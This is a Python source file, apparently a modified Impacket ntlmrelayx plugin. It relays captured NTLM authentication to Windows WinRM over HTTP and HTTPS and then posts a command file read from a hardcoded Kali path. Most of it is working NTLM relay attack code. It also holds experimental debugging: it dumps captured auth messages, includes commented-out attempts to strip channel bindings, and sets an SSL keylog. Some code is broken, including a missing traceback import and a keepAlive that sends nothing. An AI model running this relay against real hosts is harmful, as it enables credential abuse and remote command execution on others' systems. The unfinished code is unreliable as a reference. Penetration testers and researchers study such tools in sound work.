# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   WinRM Protocol Client
#   WinRM for HTTPS client for relaying NTLMSSP authentication
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#   Alberto Solino (@agsolino)
#
#   Modified for WinRM | Joe Mondloch <jmk@foofus.net>
#
import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64

# jmk - debug ssl
import os
import sslkeylog

from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
# from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
from impacket.ntlm import NTLMAuthChallenge, NTLMSSP_AV_FLAGS, AV_PAIRS, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_AV_HOSTNAME, NTLMSSP_AV_CHANNEL_BINDINGS
#from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["WinRMRelayClient","WinRMSRelayClient"]

class WinRMRelayClient(ProtocolClient):
    PLUGIN_NAME = "WINRM"

    def __init__(self, serverConfig, target, targetPort = 5985, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None
        self.isFirstNeg = True

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost,self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/wsman'
        else:
            self.path = self.target.path
        return True

    def sendNegotiate(self,negotiateMessage):
        #Check if server wants auth
        #headers = {
        #  'Content-Type':'application/soap+xml;charset=UTF-8',
        #  'Content-Length':'0'
        #}
        #self.session.request('POST', self.path, headers=headers)

        if not self.isFirstNeg:
            LOG.info("JMK-CLIENT: Post-initial negotiation.")
            self.isFirstNeg = False
            return False

        LOG.info("JMK-CLIENT: Initial negotiation.")

        #################
        file = open("/home/kali/winrm/cmd_hostname.xml")
        body_content = file.read()

        headers = {
          'Content-Length':len(body_content),
          'Content-Type':'application/soap+xml;charset=UTF-8'
        }
        self.session.request('POST', self.path,headers=headers,body=body_content)
        #################

        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'NTLM' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "NTLM"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
                self.authenticationMethod = "NTLM"
            else:
                return False

        #Negotiate auth
        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        # Do a HEAD for favicon.ico
        headers = {
          'Authorization':'%s %s' % (self.authenticationMethod, negotiate),
          'Content-Type':'application/soap+xml;charset=UTF-8',
          'Content-Length':len(body_content)
        }
        self.session.request('POST', self.path ,headers=headers,body=body_content)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod), res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        # JMK START #
        try:
          print("authMessage:\n")
          authMessage = NTLMAuthChallengeResponse()
          authMessage.fromString(token)
          authMessage.dump()

          domainName = authMessage['domain_name'].decode('utf-16le')
          print("domainName: ", domainName, "\n")

          av_pairs = authMessage['ntlm'][44:]
          av_pairs = AV_PAIRS(av_pairs)
          serverName = av_pairs[NTLMSSP_AV_HOSTNAME][1].decode('utf-16le')

          print("serverName: ", serverName, "\n")
          print("av_pairs: \n")
          av_pairs.dump()
          print("\n")

          # what does 44: mean?

          #del av_pairs[NTLMSSP_AV_CHANNEL_BINDINGS]
          #authMessage['ntlm'] + 44 = av_pairs.getData()

          #authMessage['ntlm']
          #authMessage['ntlm_len']
          #authMessage['ntlm_max_len']

          #self.authMessage['TargetInfoFields'] = av_pairs.getData()
          #self.authMessage['TargetInfoFields_len'] = len(av_pairs.getData())
          #self.authMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())

          #token = authMessage.getData()
          #print("token2: ", token, "\n")
        except Exception as e:
          print("An exception occurred:", e)
          traceback.print_exc()
        # JMK END #

        auth = base64.b64encode(token).decode("ascii")

        # JMK START #
        file = open("/home/kali/winrm/cmd_hostname.xml")
        body_content = file.read()

        headers = {
          'Authorization':'%s %s' % (self.authenticationMethod, auth),
          'Content-Type':'application/soap+xml;charset=UTF-8',
          'Content-Length':len(body_content)
        }
        self.session.request('POST', self.path, headers=headers, body=body_content)
        # JMK #
        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            #Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        #headers = {
        #  'Content-Type':'application/soap+xml;charset=UTF-8',
        #  'Content-Length':'1'
        #}

        #body = " "

        ####
        file = open("/home/kali/winrm/heartbeat.xml")
        body_content = file.read()

        headers = {
          'Content-Length':len(body_content),
          'Content-Type':'application/soap+xml;charset=UTF-8'
        }
        ####

        #self.session.request('POST', self.path ,headers=headers, body=body_content)
        #self.session.getresponse()

class WinRMSRelayClient(WinRMRelayClient):
    PLUGIN_NAME = "WINRMS"

    # jmk - debug ssl
    sslkeylog.set_keylog(os.environ.get('SSLKEYLOGFILE'))

    def __init__(self, serverConfig, target, targetPort = 5986, extendedSecurity=True ):
        WinRMRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/wsman'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return True
